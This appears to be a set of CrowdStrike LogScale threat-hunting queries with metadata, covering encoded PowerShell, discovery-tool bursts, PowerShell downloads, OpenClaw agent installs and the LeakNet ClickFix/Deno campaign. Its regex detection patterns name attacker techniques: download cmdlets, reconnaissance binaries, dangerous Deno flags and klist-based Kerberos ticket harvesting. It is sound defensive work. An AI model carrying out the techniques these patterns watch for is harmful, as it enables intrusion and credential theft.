* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: Detect and Decode Base64-Encoded PowerShell Commands

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Detect_and_Decode_Base64-Encoded_PowerShell_Commands.yml
> cql_hub_name:: Detect and Decode Base64-Encoded PowerShell Commands
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1059
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: The query identifies Windows PowerShell executions using encoded commands, extracts and decodes Base64 payloads (including nested encodings), counts occurrences and unique hosts, and outputs decoded command content for analysis of potentially obfuscated activity.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Detect_and_Decode_Base64-Encoded_PowerShell_Commands.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2 event_platform=Win ImageFileName=/.*\\powershell\.exe/
| CommandLine=/\s+\-(e|encoded|encodedcommand|enc)\s+/i
| CommandLine=/\-(?<psEncFlag>(e|encoded|encodedcommand|enc))\s+/i
| length("CommandLine", as="cmdLength")
| groupby([psEncFlag, cmdLength, CommandLine], function=stats([count(aid, distinct=true, as="uniqueEndpointCount"), count(aid, as="executionCount")]), limit=max)
| EncodedString := splitString(field=CommandLine, by="-e* ", index=1)
| CmdLinePrefix := splitString(field=CommandLine, by="-e* ", index=0)
| DecodedString := base64Decode(EncodedString, charset="UTF-16LE")
// Look for encoded messages in the decoded message and decode those too.
| case {
  DecodedString = /encoded/i
  | SubEncodedString := splitString(field=DecodedString, by="-EncodedCommand ", index=1)
  | SubCmdLinePrefix := splitString(field=EncodedString, by="-EncodedCommand ", index=0)
  | SubDecodedString := base64Decode(SubEncodedString, charset="UTF-16LE");
  *
}
| table([executionCount, uniqueEndpoitnCount, cmdLength, DecodedString, CommandLine])
| sort(executionCount, order=desc)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Reference: [GitHub CrowdStrike/logscale-community](https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Helpful-CQL-Queries/Decode%20Base64.md)
* Key Indicators: Review query output fields and filters from `Detect_and_Decode_Base64-Encoded_PowerShell_Commands.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: Frequency Analysis via Program Clustering

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Frequency_Analysis_via_Program_Clustering.yml
> cql_hub_name:: Frequency Analysis via Program Clustering
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1059
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: This query detects potential reconnaissance or lateral movement activity by identifying Windows endpoints where three or more distinct discovery/enumeration tools were executed within 10-minute windows
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Frequency_Analysis_via_Program_Clustering.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; CQL Hub lookup file availability. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Get file names of interest.
#event_simpleName=ProcessRollup2
| event_platform=Win
| FileName=/(whoami|arp|cmd|net|net1|ipconfig|route|netstat|nslookup|nltest|systeminfo|wmic|tasklist|tracert|ping|adfind|nbtstat|find|ldifde|netsh|wbadmin)\.exe$/i

// Aggregate in 10 minute buckets; set search to 24 hours.
| bucket(span=10min, field=[cid, aid, ComputerName, ParentBaseFileName, ParentProcessId], function=[count(FileName, distinct=true, as=fNameCount), collect([FileName, CommandLine], limit=50)], limit=500)

// Set threshold at three distinct file name values.
| fNameCount >= 3
| sort(fNameCount, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `Frequency_Analysis_via_Program_Clustering.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: Powershell Downloads

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Powershell_Downloads.yml
> cql_hub_name:: Powershell Downloads
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1059
> related_mitre_ids:: T1059
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: This query detects powershell downloads using `Start-BitsTransfer`, `Invoke-WebRequest`, or `System.Net.WebClient`.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Powershell_Downloads.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1059.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; CQL Hub lookup file availability. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=CommandHistory
| CommandHistory=/(Invoke-WebRequest|Net\.WebClient|Start-BitsTransfer)/i
| regex("(?<URL>https?://[^'\"\\s]+)", field=CommandHistory)
| replace("https://", with="", field=URL, as=ShortURL)
| replace("http://", with="", field=ShortURL, as=ShortURL)
| replace("\\/.*", with="", field=ShortURL, as=otx_lookup)
| UrlBase := "https://otx.alienvault.com/indicator/domain/"
| format(format="[Alienvault](%s%s)", field=[UrlBase, otx_lookup], as=DomainLookup)
| table([DomainLookup, URL, ComputerName, UserName, CommandHistory], limit=20000)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `Powershell_Downloads.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: Rare windows shell parent process

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Rare_Windows_Shell_Parent.yml
> cql_hub_name:: Rare windows shell parent process
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1059
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: This hunting query is designed to detect rare shell parent processes.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Rare_Windows_Shell_Parent.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2 event_platform=Win
| case { in(field=FileName, values=["powershell.exe", "cmd.exe", "pwsh.exe"]) | IsChild := "1"; * | IsChild := "0" }
| case { IsChild = "1" | ProcId := ParentProcessId | ChildProcess := FileName | ChildCommandLine := CommandLine;
IsChild = "0" | ProcId := TargetProcessId | ParentCommandLine := CommandLine | ParentFileName := FileName | ParentFilePath := FilePath | ParentSHA256HashData := SHA256HashData; }
| groupBy([ComputerName, ProcId], function=([count(ParentProcessId, distinct=true, as=EventCount), collect([ParentFileName, ParentSHA256HashData, ParentFilePath, ParentCommandLine, ChildProcess]), collect(ChildCommandLine, limit=4)]), limit=max)
| EventCount > 1
| groupBy([ParentSHA256HashData], function=([collect([aid, ParentFileName, ParentFilePath, ParentCommandLine, ChildProcess, ChildCommandLine]), count(ComputerName, as=HostCount)]))
| HostCount < 5
| sort([HostCount, ParentFileName], order=asc)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: This hunting query is designed to detect rare shell parent processes:  1. **Filter for Windows Events**: `#event_simpleName=ProcessRollup2``event_platform=Win`  2. **Classify Processes**: `(case { in(field=FileName, values=["powershell.exe", "cmd.exe", "pwsh.exe"]) | IsChild := "1";)`    - If the FileName matches a shell (powershell.exe, cmd.exe, pwsh.exe), the process is marked as a child process     - Otherwise, it is marked as not a child process  3. **Assign Process Information**: `ParentImageFileName!=/\\(powershell|cmd)\.exe$/i`    - For child processes (`IsChild = "1"`), the `ProcId` is set to the `ParentProcessId`    - For non-child processes (`IsChild = "0"`), the `ProcId` is set to the `TargetProcessId`  4. **Group by Computer and Process**:     - The query groups events by `ComputerName` and `ProcId` to analyze process relationships.    - Calculation of the distinct count of `ParentProcessId` as `EventCount`
* Key Indicators: Review query output fields and filters from `Rare_Windows_Shell_Parent.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: Applications Spawning CMD or Powershell

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: applications_spawning_cmd_or_powershell.yml
> cql_hub_name:: Applications Spawning CMD or Powershell
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1059
> related_mitre_ids:: T1059
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: Table listing processes that spawned cmd.exe or powershell.exe child processes.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`applications_spawning_cmd_or_powershell.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1059.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
"#event_simpleName" = ProcessRollup2 event_platform="Win" FileName=/(cmd.exe|powershell.exe)/i
| wildcard(field=ComputerName, pattern=?ComputerName, ignoreCase=true)
| groupBy([ParentBaseFileName], function=[count(aid, distinct=true, as="DistinctHosts")])
| sort(DistinctHosts)
| rename(field="ParentBaseFileName", as="FileName")
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `applications_spawning_cmd_or_powershell.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: CVE-2026-32202 - Windows Shell

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint, Network
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cve_2026_32202_windows_shell.yml
> cql_hub_name:: CVE-2026-32202 - Windows Shell
> cql_hub_author:: ML
> related_mitre_ids:: T1059
> cql_hub_tags:: Hunting, Monitoring, Detection
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: Exploitation of Windows Shell CVE-2026-32202

* Telemetry Requirements: Endpoint, Network
* Source: CQL Hub (`cve_2026_32202_windows_shell.yml`), author: ML.

#### Production-Ready CQL Query:

```cql
setTimeInterval(start=1h, end=0h)
| in(field=#event_simpleName, values=["SmbClientShareClosedEtw", "SmbClientShareLogonBruteForceLowThreshold", "SmbClientShareLogonBruteForceSuspected", "SmbClientShareOpenedEtw", "SmbServerShareOpenedEtw", "SmbServerV1AuditEtw", "ProcessRollup2"])
| RemoteAddressIP4=*
| !cidr(RemoteAddressIP4, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8", "169.254.0.0/16"])
| default(field=[RemoteAddressIP4, LinkName], value="N/A", replaceEmpty=true)
| groupBy([ComputerName], function=[collect([#event_simpleName, SmbShareName, SmbClientName, ClientComputerName, DomainName, destination.ip, RemoteAddressIP4, LinkName], limit=50)], limit=20000)
| sort(RemoteAddressIP4, order=asc)
```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: ref: https://thehackernews.com/2026/04/microsoft-confirms-active-exploitation.html
* Key Indicators: Review query output fields and filters from `cve_2026_32202_windows_shell.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: Find OpenClaw on Endpoints

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: find_openclaw_on_endpoints.yml
> cql_hub_name:: Find OpenClaw on Endpoints
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1059
> related_mitre_ids:: T1059
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: Identifies the installation, configuration, and execution of the OpenClaw (Moltbot/Clawdbot) autonomous AI agent. OpenClaw poses a significant risk for shadow AI and data exfiltration as it requires extensive permissions (Shell, APIs, Local Files) and is often controlled via messaging apps like WhatsApp or Telegram.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`find_openclaw_on_endpoints.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1059.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#repo="base_sensor"
| #event_simpleName =~ in(values=["*ProcessRollup2", "*FileWritten"])
| case {
  // Look for the curl install method
  CommandLine=/openclaw\.ai\/install\.sh/
    | Action := "openclaw installed";

  CommandLine=/openclaw\.ai\/install\.ps1/
    | Action := "openclaw installed";
  // Look for node package install methods
  CommandLine =~ in(values=["* openclaw*", "* clawdbot*", "* moltbot*"])
    | CommandLine =~ in(values=["*npm*", "*npx*", "*brew*"])
    | CommandLine="* install *"
    | Action := "openclaw installed";

  // Look for files being written to user home directories
  FilePath =~ in(values=["*/.openclaw/*", "*/.clawdbot/*", "*/.moltbot/*"])
    | Action := "openclaw user configuration updated";

  // Look for the clawdbot service being started on port tcp/18789
  CommandLine =~ in(values=["*openclaw*", "*clawdbot*", "*moltbot*"])
    | ImageFileName=/node/i
    | CommandLine=/gateway --port 18789/i
    | Action := "openclaw service started";
    
  // Look for the clawdbot service being started
  CommandLine =~ in(values=["*openclaw*", "*clawdbot*", "*moltbot*"])
    | FileName=/node/i
    | CommandLine=/gateway/i
    | Action := "openclaw service started";
}
| groupby(
  aid, 
  ComputerName, 
  UserName, 
  function=[
    collect(Action), 
    selectLast([CommandLine, ImageFileName, #event_simpleName])
  ]
)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: # Detection Logic:  ### Installation: Monitors for web-based install scripts (install.sh/ps1) and package manager activity (npm, npx, brew) related to OpenClaw.  ### Configuration: Tracks file-write events to hidden user directories (.openclaw, .clawdbot, .moltbot) where plaintext API keys and skill configs are typically stored.  ### Execution: Detects the Node.js-based gateway service starting on the default port 18789 or via specific command-line arguments.
* Key Indicators: Review query output fields and filters from `find_openclaw_on_endpoints.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1204.001]] - Malicious Link — CQL Hub: LeakNet Campaign: Deno Runtime & Klist Suspicious Execution Detection

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1204.001
> technique_name:: Malicious Link
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: leaknet_campaign_deno_runtime_klist_suspicious_execution_detection.yml
> cql_hub_name:: LeakNet Campaign: Deno Runtime & Klist Suspicious Execution Detection
> cql_hub_author:: cap10
> cql_hub_mitre_ids:: T1204.001, T1059
> related_mitre_ids:: T1204.001, T1059
> cql_hub_tags:: Hunting, Detection
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: Detects indicators of the LeakNet campaign (analyzed by ReliaQuest, March 2026), which uses ClickFix a social engineering tactic where compromised websites display fake error dialogs that coerce users into manually pasting and executing a malicious PowerShell/CMD command. This delivers a portable Deno (JavaScript runtime) binary to user-writable directories that runs malicious payloads entirely in memory, avoiding disk-based detection. The query targets the post-delivery kill chain: Deno execution from AppData/Temp/ProgramData paths, klist.exe usage from interactive shells indicating Kerberos ticket harvesting, Deno spawning reconnaissance and living-off-the-land binaries, and dangerous Deno runtime flags or remote code fetch patterns. A noise reduction filter excludes Deno running from standard developer or Program Files paths.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`leaknet_campaign_deno_runtime_klist_suspicious_execution_detection.yml`), author: cap10.
* Original CQL Hub MITRE IDs: T1204.001, T1059.
* Related/Resolved MITRE IDs: T1204.001, T1059.

#### Production-Ready CQL Query:

```cql
#event_simpleName=ProcessRollup2
| (
    /* ── Clause 1: Deno launched from user-writable locations ── */
    (
      ImageFileName=/\\deno(\.exe)?$/i
      AND ImageFileName=/\\(Users\\[^\\]+\\AppData\\(Local|Roaming)|Temp|ProgramData)\\/i
    )

    OR

    /* ── Clause 2: klist launched from interactive shells or script hosts ── */
    (
      ImageFileName=/\\klist\.exe$/i
      AND ParentBaseFileName=/^(cmd|powershell|pwsh|wscript|cscript|mshta)\.exe$/i
    )

    OR

    /* ── Clause 3: Suspicious child processes spawned by Deno ── */
    (
      ParentBaseFileName=/^deno(\.exe)?$/i
      AND ImageFileName=/\\(cmd|powershell|pwsh|net|net1|whoami|hostname|nltest|dsquery|quser|qwinsta|vssadmin|wbadmin|reg|wevtutil|ipconfig|systeminfo|tasklist|qprocess|schtasks|wmic|bitsadmin|certutil)\.exe$/i
    )

    OR

    /* ── Clause 4: Deno with dangerous flags or remote code execution patterns ── */
    (
      ImageFileName=/\\deno(\.exe)?$/i
      AND CommandLine=/(eval|--allow-all|--allow-net|--allow-run|https?:\/\/|atob\(|base64|WebSocket|fetch\()/i
    )
  )

/* ── Noise reduction: exclude Deno running from known-good install/dev paths ── */
| !(
    ImageFileName=/\\deno(\.exe)?$/i
    AND ImageFileName=/\\(Program Files|Program Files \(x86\)|tools|dev|repos|source|git)\\/i
  )

| table([@timestamp, aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine, SHA256HashData])
| sort(@timestamp, order=desc)

//══════════════════════════════════════════════════════════════════════════════════════════════════
// ENHANCEMENT OPTIONS
//══════════════════════════════════════════════════════════════════════════════════════════════════
//
// ── Option A: Correlate Deno process execution with outbound network connections ──
// Uses selfJoinFilter to link ProcessRollup2 with NetworkConnectIP4 on the same
// agent and process ID, then filters out internal RFC1918/loopback traffic.
//
//   #event_simpleName = /ProcessRollup2|NetworkConnectIP4/
//   | falconPID := ContextProcessId_decimal
//   | falconPID := TargetProcessId_decimal
//   | selfJoinFilter(field=[aid, falconPID], where=[
//       {#event_simpleName = ProcessRollup2 | ImageFileName = /\\deno(\.exe)?$/i},
//       {#event_simpleName = NetworkConnectIP4}
//   ])
//   | RemoteAddressIP4 != "10.*"
//   | RemoteAddressIP4 != "172.16.*"
//   | RemoteAddressIP4 != "192.168.*"
//   | RemoteAddressIP4 != "127.*"
//   | groupBy([aid, ComputerName, ImageFileName, RemoteAddressIP4, RemotePort], function=[count(), collect(CommandLine)])
//   | sort(_count, order=desc)
//
// ── Option B: Correlate Deno with DNS requests for domain-based C2 detection ──
//
//   #event_simpleName = /ProcessRollup2|DnsRequest/
//   | falconPID := ContextProcessId
//   | falconPID := TargetProcessId
//   | selfJoinFilter(field=[aid, falconPID], where=[
//       {#event_simpleName = ProcessRollup2 | ImageFileName = /\\deno(\.exe)?$/i},
//       {#event_simpleName = DnsRequest}
//   ])
//   | groupBy([aid, ComputerName, DomainName], function=[count(), collect(CommandLine)])
//   | sort(_count, order=desc)
//
// ── Option C: Group by user to surface high-frequency discovery bursts ──
//
//   // Append after the main query's table() line:
//   // | groupBy([UserName, ComputerName], function=count(as=exec_count))
//   // | sort(exec_count, order=desc)
//   // | test(exec_count > 5)
//
//══════════════════════════════════════════════════════════════════════════════════════════════════

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: This query detects post-exploitation activity associated with the LeakNet campaign, which was publicly analyzed by ReliaQuest in March 2026. LeakNet uses ClickFix — a social engineering technique where compromised websites present fake browser or application error dialogs that instruct users to copy a malicious command and paste it into a Run dialog or terminal. The pasted command downloads and executes a portable Deno binary, which then runs JavaScript payloads entirely in memory to evade traditional file-based detection.  The query monitors CrowdStrike Falcon EDR `ProcessRollup2` telemetry and applies four detection clauses covering distinct stages of the LeakNet kill chain, followed by a noise reduction filter.  CAMPAIGN DETAILS: Campaign: LeakNet Reference: ReliaQuest Threat Research, March 2026 Delivery: ClickFix social engineering → user-pasted PowerShell/CMD command Payload: Portable Deno binary dropped to AppData/Temp Execution: In-memory JavaScript payloads via Deno runtime Post-Exploitation: Credential enumeration (klist), host discovery, C2 callbacks  VULNERABILITY DETAILS: CVE: N/A (Campaign-Specific TTPs / Living off the Land) Type: Initial Access, Execution, Credential Access, Discovery, Lateral Movement Status: ACTIVE CAMPAIGN — MONITORING FOR ANOMALOUS USAGE  MITRE ATT&CK MAPPING: T1204.001 - User Execution: Malicious Link (ClickFix) T1059.007 - Command and Scripting Interpreter: JavaScript/TypeScript T1059.001 - Command and Scripting Interpreter: PowerShell T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting T1082     - System Information Discovery T1033     - System Owner/User Discovery T1016     - System Network Configuration Discovery T1087     - Account Discovery Tactics: Initial Access, Execution, Credential Access, Discovery, Lateral Movement  EXPLOITATION REQUIREMENTS: - User interaction required (ClickFix paste-and-execute social engineering) - Deno binary present on disk (often portable/non-installed) - Execution within user-writable context (AppData/Temp) - Network access for remote script fetching (--allow-net)  USE CASES: - Detect Deno-based malware or C2 stagers - Identify Kerberos ticket enumeration via klist.exe - Track post-exploitation discovery commands spawned by script runtimes - Flag dangerous Deno permission flags and remote code execution patterns  DATA SOURCE: Event Type: ProcessRollup2 Required Fields: ImageFileName, CommandLine, ComputerName, UserName, ParentBaseFileName Sensor: CrowdStrike Falcon EDR  AFFECTED SYSTEMS: - Windows 10/11 - Windows Server 2016/2019/2022  FALSE POSITIVES: - Legitimate developer activity (Deno used in IDE/Repos) - Automated IT scripts using klist for troubleshooting - Deno-based internal tools running from standard Program Files paths - DevOps pipelines that invoke Deno with --allow-net against internal registries  INVESTIGATION NOTES: 1. Check if the Deno binary is signed and from a known developer location. 2. Review the CommandLine for --allow-all or remote URLs (http/https). 3. Correlate klist usage with recent logins or network connections to Domain Controllers. 4. Inspect the parent process of klist.exe; interactive shells are higher risk. 5. Verify if the user is a known developer or DevOps engineer. 6. Cross-reference SHA256HashData against known-good Deno release hashes.  TUNING RECOMMENDATIONS: - Add specific exclusion for local 'dev' or 'git' directories. - Filter out known-good service accounts that use klist for health checks. - Baseline Deno usage by SHA256 if a standard version is deployed. - Add UserName exclusions for known developer accounts if discovery clause is noisy.  REMEDIATION: Priority: MEDIUM (Context Dependent) Action: Quarantine suspicious Deno binaries found in AppData/Temp. Patches: Ensure Deno is updated to the latest version to prevent engine exploits.  QUERY LOGIC: 1. Filters for ProcessRollup2 events. 2. Checks for Deno in writable paths (Local/Roaming/Temp/ProgramData). 3. Flags klist.exe when spawned by common shells or script hosts. 4. Monitors Deno spawning living-off-the-land and discovery binaries. 5. Identifies dangerous Deno flags or remote fetch commands in the command line. 6. Applies a global noise reduction for standard Program Files or developer paths.
* Key Indicators: Review query output fields and filters from `leaknet_campaign_deno_runtime_klist_suspicious_execution_detection.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.
